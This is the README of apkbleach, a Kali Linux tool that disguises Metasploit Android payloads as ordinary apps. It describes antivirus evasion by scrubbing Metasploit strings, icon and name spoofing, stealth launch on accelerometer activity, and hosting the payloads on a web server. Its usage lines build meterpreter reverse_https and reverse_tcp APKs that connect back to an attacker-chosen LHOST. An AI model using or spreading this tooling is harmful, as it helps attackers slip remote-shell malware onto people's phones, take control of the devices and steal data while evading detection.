[![Language grade: Python](https://img.shields.io/lgtm/grade/python/g/graylagx2/ApkBleach.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/graylagx2/ApkBleach/context:python)
# apkbleach 2.1

**Update**
   12/11/2020 Fixed package pathways and no longer use /tmp directory
   11/24/2020 Fixed custom icon injection bug and jarsigner installation bug! Shout out to @VioletChan on youtube for reporting the bug.

![Screen shot of sofware image](https://github.com/graylagx2/Images/blob/master/apkbleach2_final.png)

**About:**

This software was developed specifically for Kali-Linux to obfuscate android payloads in attempts to evade detection. This software also automates the process of changing the app icon, changing the app name, signing the apk, aligning the apk and installing or upgrading apktool.

**Youtube instructional video:**

[![Watch the video](https://github.com/graylagx2/images/blob/master/Screenshot%20(24).png)](https://www.youtube.com/watch?v=tqgscJ93LFw)
   
**New Deployment UI feature**

![Screen shot of deployment image](https://github.com/graylagx2/Images/blob/master/apkbleach-deployment-ui.png)

**Features:**

1) User interface for deployment of payloads

2) Line by line permissions editing. The software will go through each permission in the manifest and ask if you want to delete it.

3) Stealth option. This executes the payload off the devices accelerometer instead of on open. This option also allows you to choose how many sessions you want spawned of exploit.

4) Custom icon injection. This allows users to modify the app icon that appears on the home screen of a android device. You can choose from a icon apkbleach provides or you can supply your own. Apkbleach will do all the work for you.

5) Renames the application to the name you put chose as the ouput file

6) Scrubs the entire application of any mentions of the name "metasploit" , "stage" or "payload". There are a lot by the way. sending security testing with an app that contains the name metasploit is just funny :-)

7) Adds padnops to PAYLOAD

8) Signs apk with jarsigner. msfenom produces unsigned apps

9) Zip aligns apk

10) Apktool upgrade feature. If the software detects youre using apktool version 2.4.1-dirty which is Kali's package maintainers version it will ask if you want to replace it with the lates version frfom ibot peaches. This is a good idea because it conflicts with the msfvenom -x option and throws a version number error. Not to mention the problems it has given users in the past.

**Usage:**

    apkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 3 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk
    
    apkbleach -g android/meterpreter/reverse_tcp LHOST=address LPORT=port -s 3 --edit-permissions --deploy-all

     apkbleach --list-payloads
 
     apkbleach --list-icons
 
     apkbleach --clear-cache
 

**optional arguments:**

      -h, --help            show this help message and exit
  
      -g [PAYLOAD] [LHOST] [LPORT]
                        Generates a payload
                        
      -s [number of sessions to spawn 1-5]
                        Executes payload on accelerometer activity instead of on open
                        
      -i [BLEACH_icon..] or [path/to/custom/icon]
                        Injects an icon
                        
      -o [output/path/for/file.apk]
                        Path to output apk
                        
      --edit-permissions    Enables permission editing in apk's manifest
      
      --deploy-all          Deploys each available icon as a payload with the apache2 server with a web interface
  
      --list-payloads       List available icons
  
      --list-icons          List available icons
  
      --clear-cache         Allows prompt whether to keep package maintainers version apktool
  
**Install instructions:**

After cloning or downloading the repository cd into the apkbleach directory and run run install.sh

    cd apkbleach
    bash install.sh
    
or

    cd apkbleach
    chmod +x install.sh
    ./install.sh
